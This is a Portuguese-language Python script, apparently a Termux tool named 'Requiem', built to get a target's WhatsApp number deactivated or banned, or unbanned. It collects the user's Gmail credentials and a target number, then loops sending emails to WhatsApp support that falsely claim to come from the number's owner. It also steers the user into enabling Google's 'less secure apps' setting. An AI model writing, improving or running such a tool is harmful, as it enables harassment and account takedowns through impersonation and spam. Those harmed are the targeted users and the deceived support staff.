#!/usr/bin/env python
# -- coding: utf-8 --
global R,B,C,Y,G,RT,CY,CO
CO='\033[m';R='\033[1;31m';B='\033[1;34m';C='\033[1;37m';CY='\033[1;36m';Y='\033[1;33m';G='\033[1;32m';RT='\033[;0m';NO_FORMAT="\033[0m";C_GREY89="\033[38;5;254m";C_RED1="\033[48;5;196m"
import smtplib, os, sys, time, ssl, getpass
def link():
	os.system("termux-open-url https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4OSggjYOgt8g8HbgSU58LpUqQ5GsD63ipENqa84YegMHionqqvIXMMoc4bqu-C0GH0N--Kal_AFpd5rRJYyO0g-y1AbEQ")

def restart():
    python = sys.executable;os.execl(python, python, *sys.argv)

def clear():
	os.system("clear")

clear()
try:
	import pyfiglet
except:
	os.system("pip install pyfiglet");restart()

result = pyfiglet.figlet_format("R e q u i e m", font = "cosmic" )
print(f'''{C}{G}{result}{C}''')
p = input(f'{C}[{G}!{C}] Digite a Senha: ')
if p == '7a3Campos':
    print(f'{C}[{G}*{C}] Acesso Liberado');pass
else:
    print(f'{C}[{R}*{C}] Senha Incorreta');time.sleep(2);restart()
	

block_num = ["+55 21 7918-0533","+55 21 79180533","55 21 7918053333","55 21 7918-0533","+55217918-0533","+552179180533","552179180533","55217918-0533"]

def init():
	try:
		while True:
			for num in block_num:
				if num in numero:
					print(f'\n{C}[{R}!{C}] NÚMERO PROIBIDO.');time.sleep(3);restart()
			port = 465
			smtp_server = "smtp.gmail.com"
			sender_email = "{}".format(email)
			receiver_email = "support@support.whatsapp.com"
			context = ssl.create_default_context()
			with smtplib.SMTP_SSL(smtp_server, port, 			context=context) as server:
			 	server.login(sender_email, password)
			 	server.sendmail(sender_email, receiver_email, message)
	except:
		print(f"{C}[{R}ERROR{C}] Permissao nao garantida ou senha e email invalido(s).");time.sleep(5);pass

Sair = True
while(Sair == True):
	clear();print(f'''{C}{G}
{result}
...`
                             .+ss+//oss:`
                         `:oy+-       `:ss+.
                      `/ss/`              -oyo-
                   -+yo:                     `/ys/`
               `:sy+.                           `:sy+.
            `/ss/`                                  -+yo+
           -h/                                         .ys`
          `m-                                        -+ssdo
          -d                                      :sdNNNNNd
          :d                                  `/ymNNNNNNNNd
          :d                               .+hNNNNNNNNNNNNd
          :d                            -odNNNNNNNNNNNNNNNd
          :d                         :sdNNNNNNNNNNNNNNNNNNd
          :d                       +mNNNNNNNNNNNNNNNNNNNNNd
          :d                      sNNNNNNNNNNNNNNNNNNNNNNNd
          :d                      hNNNNNy`yyNNNNNNNNNNNNNNd
          :d                      hNNNNh-.:sNNNNNNNNNNNNNNd
          :d                      hNNNh`+NNNNNNNNNNNNNNNNNd
          -d                      hNNNy  `./mNNNNNNNNNNNNNd
          `m.                     hNNNNdyy- dNNNNNhmNNNNNNs
           :d:                    hNNNNNmh./NNmy/-+mNNNNNy`
            `+ys:`                hNNNh`` yNNNoodNNNNNmy:
               `/yy/.             hNNNNmh/mNNNNNNNNdo-
                  `:syo-          hNNNNNNNNNNNNNh+.
                      .+ys:`      hNNNNNNNNNms/`
                         `/sy+.   yNNNNNNdo-
                             -oyo/+mNmy/.
                                `-:::
{C}\n{C}{G}Coded By:{C} Kiny\n{C}[{R}*{C}] Ative a permissão de baixa segurança e utilize um email por ataque(recomendação).''');link();op = input(f"\n{C}{Y}O'que deseja fazer?{C}\n{C}[{G}1{C}] Desativar Numero\n{C}[{G}2{C}] Retirar do Contador\n{C}[{G}3{C}] Retirar Banimento\n{C}[{G}4{C}] Banir Numero{C}\n{C}[{R}0{C}] Sair\n{C}[{G}Digite a opção{C}]: ")
	if op == '1':
		email = input(f'{C}[{Y}Gmail{C}]: ');password = input(f'{C}[{Y}Senha (Não se preocupe, não temos acesso à sua senha){C}]: ');numero = input(f'{C}[{Y}Numero do Alvo (ex: 55 21 9****){C}]: ')
		message = """\
Subject: Desative este numero

Desative esta conta urgentemente: {}""".format(numero)
		print(f'{C}{R}Desativando Número!{C}\nUse {C}{R}CTRL C{C} para parar o script e {C}{G}python3 main.py{C} para reiniciar.');init()

	elif op == '2':
		email = input(f'{C}[{Y}Gmail{C}]: ');password = input(f'{C}[{Y}Senha (Não se preocupe, não temos acesso à sua senha){C}]: ');numero = input(f'{C}[{Y}Numero do Alvo (ex: 55 21 9****){C}]: ')
		message = """\
Subject: Reenviar codigo de verificacao

Ola, nao consigo me registrar na minha conta, me ajudem: {}""".format(numero)
		print(f'{C}{G}Tirando do Contador!{C}\nUse {C}{R}CTRL C{C} para parar o script e {C}{G}python3 main.py{C} para reiniciar.');init()

	elif op == '3':
		email = input(f'{C}[{Y}Gmail{C}]: ');password = input(f'{C}[{Y}Senha (Não se preocupe, não temos acesso à sua senha){C}]: ');numero = input(f'{C}[{Y}Numero do Alvo (ex: 55 21 9****){C}]: ')
		message = """\
Subject: Numero banido

Meu numero foi banido indevidamente, isto foi um engano. Fui enganado e roubaram meu numero, preciso ativar minha conta, pois tenho uma empresa e tenho pedidos pendentes: {}""".format(numero)
		print(f'{C}{G}Retirando Banimento!{C}\nUse {C}{R}CTRL C{C} para parar o script e {C}{G}python3 main.py{C} para reiniciar.');init()

	elif op == '4':
		email = input(f'{C}[{Y}Gmail{C}]: ');password = input(f'{C}[{Y}Senha (Não se preocupe, não temos acesso à sua senha){C}]: ');numero = input(f'{C}[{Y}Numero do Alvo (ex: 55 21 9****){C}]: ')
		message = """\
Subject: Facam o banimento do meu numero

Favor banir meu numero: {}""".format(numero)
		print(f'{C}{R}Banindo!{C}\nUse {C}{R}CTRL C{C} para parar o script e {C}{G}python3 main.py{C} para reiniciar.');init()

	elif op == '0':
		Sair = False
os.system('rm -rf __pycache__')
print(f'[{C}{R}+{C}] [{C}{R}Arrivederci{C}]')
